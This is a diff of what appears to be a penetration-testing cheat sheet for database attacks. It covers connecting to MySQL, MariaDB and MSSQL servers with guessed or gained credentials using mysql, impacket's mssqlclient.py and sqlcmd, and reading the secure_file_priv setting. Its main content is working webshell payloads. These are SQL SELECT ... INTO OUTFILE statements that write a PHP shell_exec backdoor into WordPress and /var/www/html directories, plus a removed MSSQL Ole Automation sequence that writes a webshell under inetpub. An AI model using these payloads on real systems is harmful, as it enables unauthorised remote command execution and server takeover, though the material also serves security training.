@@ -42,11 +42,12 @@ mariadb -h <host/IP> -u root
 ### From Linux
 
 ```bash
+mysql -u username -pPassword123 -h $ip
 # -h host/ip   
 # -u user As default mysql has a root user with no authentication
+
 mysql --host=INSTANCE_IP --user=root --password=thepassword
 mysql -h <host/IP> -u root -p<password>
-
 mysql -u root -h <host/IP>
 ```
 
@@ -63,28 +64,34 @@ sqsh -S $ip -U .\\username -P 'MyPassword!' -h
 
 #### mssqlclient.py from impacket 
 
-```shell-session
+```bash
 mssqlclient.py -p $port username@$ip 
 ```
 
+If we can guess or gain access to credentials, this allows us to remotely connect to the MSSQL server and start interacting with databases using T-SQL (`Transact-SQL`). Authenticating with MSSQL will enable us to interact directly with databases through the SQL Database Engine. From Pwnbox or a personal attack host, we can use Impacket's mssqlclient.py to connect as seen in the output below. Once connected to the server, it may be good to get a lay of the land and list the databases present on the system.
+
+```bash
+python3 mssqlclient.py Administrator@$ip -windows-auth  
+# With python3 mssqlclient.py help you can see more options.
+```
 
 
 ### From windows
 
 #### mysql.exe
 
-```cmd-session
+```powershell
 mysql.exe -u username -pPassword123 -h $IP
 ```
 
 #### sqlcmd
 
-```cmd-session
+```powershell
 sqlcmd -S <server> -U <username> -P 'MyPassword!' -y 30 -Y 30
 # When we authenticate to MSSQL using `sqlcmd` we can use the parameters `-y` (SQLCMDMAXVARTYPEWIDTH) and `-Y` (SQLCMDMAXFIXEDTYPEWIDTH) for better looking output. Keep in mind it may affect performance.
 ```
 
-## mariadb commands
+## Mariadb basic commands
 
 ```bash
 # Get all databases
@@ -104,14 +111,6 @@ show columns from <table>;
 
 # Select column from table
 select usename,password from users;
-```
-
-## Upload a shell 
-
-Take a wordpress installation that uses a mysql database. If you manage to login into the mysql panel (/phpmyadmin) as root then you could upload a php shell to the /wp-content/uploads/ folder.
-
-```mysql
-Select "<?php echo shell_exec($_GET['cmd']);?>" into outfile "/var/www/https/blogblog/wp-content/uploads/shell.php";
 ```
 
 ## mysql basic commands
@@ -179,58 +178,49 @@ database()
 
 ## Command execution
 
+### Upload a shell 
+
+Take a wordpress installation that uses a mysql database. If you manage to login into the mysql panel (/phpmyadmin) as root then you could upload a php shell to the /wp-content/uploads/ folder.
+
+```mysql
+Select "<?php echo shell_exec($_GET['cmd']);?>" into outfile "/var/www/https/blogblog/wp-content/uploads/shell.php";
+```
+
 ### Writing files
 
 `MySQL` supports [User Defined Functions](https://dotnettutorials.net/lesson/user-defined-functions-in-mysql/) which allows us to execute C/C++ code as a function within SQL, there's one User Defined Function for command execution in this [GitHub repository](https://github.com/mysqludf/lib_mysqludf_sys).
 
-`MySQL` does not have a stored procedure like `xp_cmdshell`, but we can achieve command execution if we write to a location in the file system that can execute our commands. 
+`MySQL` does not have a stored procedure like `xp_cmdshell`, but we can achieve command execution if we write to a location in the file system that can execute our commands. So basically, we need to check if we have enough privileges to do so. 
 
-- If `MySQL` operates on a PHP-based web server or other programming languages like ASP.NET, having  the appropriate privileges, attempt to write a file using [SELECT INTO OUTFILE](https://mariadb.com/kb/en/select-into-outfile/) in the webserver directory. 
-- Browse to the location where the file is and execute the commands.
+In MySQL, a global system variable secure_file_priv limits the effect of data import and export operations, such as those performed by the LOAD DATA and SELECT … INTO OUTFILE statements and the LOAD_FILE() function. 
 
-```mysql
- SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
-```
+If `secure_file_priv` is set as:
 
-- In `MySQL`, a global system variable [secure_file_priv](https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv) limits the effect of data import and export operations, such as those performed by the `LOAD DATA` and `SELECT … INTO OUTFILE` statements and the [LOAD_FILE()](https://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_load-file) function. These operations are permitted only to users who have the [FILE](https://dev.mysql.com/doc/refman/5.7/en/privileges-provided.html#priv_file) privilege.
-- Settings in the `secure_file_priv`:
-	- If empty, the variable has no effect, which is not a secure setting as we can read and write data using `MySQL`:
-		
-		```mysql
-		show variables like "secure_file_priv";
-		```
+- *set to NUL*: the server disables import and export operations. We can't do anything.
+- *set to the name of a directory*: the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.
+- *is empty*: the variable has no effect, which is not a secure setting. 
+
+Example:
 
 ```shell-session
+mysql> show variables like "secure_file_priv";
 
 +------------------+-------+
 | Variable_name    | Value |
 +------------------+-------+
 | secure_file_priv |       |
 +------------------+-------+
+
+1 row in set (0.005 sec)
 ```
 
-```cmd-session
-# To write files using MSSQL, we need to enable Ole Automation Procedures, which requires admin privileges, and then execute some stored procedures to create the file:
 
-sp_configure 'show advanced options', 1;
-RECONFIGURE;
-sp_configure 'Ole Automation Procedures', 1;
-RECONFIGURE;
-
-# Using MSSQL to Create a File
-DECLARE @OLE INT;
-DECLARE @FileID INT;
-EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT;
-EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1;
-EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>';
-EXECUTE sp_OADestroy @FileID;
-EXECUTE sp_OADestroy @OLE;
-
+Now, as for demo purposes, let's imagine that `MySQL` operates on a PHP-based web server or other programming languages like ASP.NET, having  the appropriate privileges, we will attempt to write a file using [SELECT INTO OUTFILE](https://mariadb.com/kb/en/select-into-outfile/) in the webserver directory. 
+ 
+```mysql
+# Browse to the location where the file is and execute the commands.
+ SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
 ```
-
-- If set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.
-- If set to NULL, the server disables import and export operations.
-
 
 ### Reading files
 
